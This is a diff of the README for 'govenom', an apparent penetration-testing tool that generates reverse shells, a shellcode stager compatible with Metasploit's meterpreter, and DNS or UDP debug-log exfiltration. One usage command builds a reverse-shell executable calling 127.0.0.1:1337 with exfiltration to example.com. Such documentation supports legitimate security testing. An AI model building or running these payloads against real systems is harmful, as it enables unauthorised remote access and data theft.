@@ -1,50 +1,50 @@
 <p align="center">
+  <img alt="govenom Logo" src="https://repository-images.githubusercontent.com/208469800/1d777d80-e3d9-11ea-8f39-739f2e6af4d9" height="140" />
   <h1 align="center"><b>govenom</b></h1>
   <p align="center"><i>No clue about the target environment, installed shells, firewall rules? Uncommon CPU architecture?</br>Govenom has you covered!</i></p>
   <p align="center">
     <a href="https://github.com/erikgeiser/govenom/releases/latest"><img alt="Release" src="https://img.shields.io/github/release/erikgeiser/govenom.svg?style=for-the-badge"></a>
     <a href="/LICENSE.md"><img alt="Software License" src="https://img.shields.io/badge/license-MIT-brightgreen.svg?style=for-the-badge"></a>
     <a href="https://github.com/erikgeiser/govenom/actions?workflow=Check"><img alt="GitHub Actions" src="https://img.shields.io/github/workflow/status/erikgeiser/govenom/Check?label=Check&style=for-the-badge"></a>
+    <a href="https://github.com/erikgeiser/govenom/actions?workflow=Build"><img alt="GitHub Actions" src="https://img.shields.io/github/workflow/status/erikgeiser/govenom/Build?label=Build&style=for-the-badge"></a>
     <a href="https://goreportcard.com/report/github.com/erikgeiser/govenom"><img alt="Go Report Card" src="https://goreportcard.com/badge/github.com/erikgeiser/govenom?style=for-the-badge"></a>
-    <a href="http://pkg.go.dev/github.com/erikgeiser/govenom"><img alt="Go Doc" src="https://img.shields.io/badge/godoc-reference-blue.svg?style=for-the-badge"></a>
   </p>
 </p>
 
 `govenom` is a `msfvenom`-inspired payload generator written in
 Go. This makes it easy to cross-compile static binaries for a
-variety of target platforms, although currently `govenom` has a
-strong focus on Windows as payload target platform.
+variety of target platforms.
 
 ## Payloads
 
-Currently, three payloads are supportet:
+Currently, three payloads are supported:
 
-* **rsh:** A simple reverse TCP shell. It selects one of the most
-common shells and makes it available via TCP or UDP connection.
-* **xrsh:** An extenden robust reverse TCP shell. A simple heuristic
-determines the must suitable shell executable, taking shells that
-are installed buth not in `$PATH` into account. In contrast to most
+* **rsh:** A simple reverse shell. It selects one of the most common
+ shells binaries and makes it available via TCP or UDPconnection.
+* **xrsh:** An extended robust reverse shell. A simple heuristic
+determines the most suitable shell executable, taking shells that
+are installed but not in `$PATH` into account. In contrast to most
 other available shells out there, additional info can be sent via
 alternative communication channels via the exfiltration mechanism
 (see relevant section below). For example, if no shell could be
 detected or the connection could not be established due to a
 firewall, the corresponding error can be exfiltrated via DNS.
-* **stager**: A TCP based shellcode stager that is compatible with
-Metasploits `exploits/multi/handler` with a `meterpreter/reverse_tcp`
-payload. It first reads a 4 Byte shellcode length and then the
-shellcode itself from a TCP connection and executes it. Currently,
-this is only available for Windows targets.
+* **stager**: A shellcode stager that is compatible with Metasploits
+`exploits/multi/handler` with a `meterpreter/reverse_tcp` payload.
+It first reads a 4 Byte shellcode length and then the shellcode
+itself from a TCP connection and executes it. Currently, this is
+only available for Windows targets.
 
 ## Exfiltration
 
 Sometimes a shell you placed on target system does not appear to
 connect back. Most of the time this results in a lot of trial and
-error. Maybe the firewall blocks TCP connections, or maybe one of
-the ports you tried. Maybe you expected `powershell` to be present
-but only `cmd` is there. The solution to problem is the `govenom`
-debug log exfiltration mechanism which can optionally be used with
-`xrsh` and `stager` payloads. It lets you configure an arbitrary
-amount of exfiltration strategies of the following types:
+error. Maybe the firewall blocks TCP connections or maybe just one
+of the ports you tried. Maybe you expected `powershell` to be
+present but only `cmd` is there. The solution to problem is the
+`govenom` debug log exfiltration mechanism which can optionally be
+used with `xrsh` and `stager` payloads. It lets you configure an
+arbitrary amount of exfiltration strategies of the following types:
 
 * **`stdout`/`stderr`:** If you can capture the output of your
 payload when it's executed, you can output debug logs via
@@ -86,7 +86,7 @@ go run ./govenom.go payload xrsh -d 127.0.0.1:1337 \
     --exfil dns:example.com,stdout,dial:udp:127.0.0.1:1234 \
     -o revsh.exe
 
-# run the 
+# run a tool
 go run ./govenom.go tool dnslogger
 ```
 
@@ -96,6 +96,8 @@ also used by `govenom` itself to build the selected payloads.
 ## Plans
 
 * Connection encryption
-* Reverse shell listener like `ncat` with loggin capabilities
-* Embedding payload code into the `govenom` binary
+* Reverse shell listener like `ncat` with logging capabilities
+* Embedding payload source code into the `govenom` binary
 * Windows support for the `stager` payload
+
+Thanks to [https://quasilyte.dev]() for the logo.
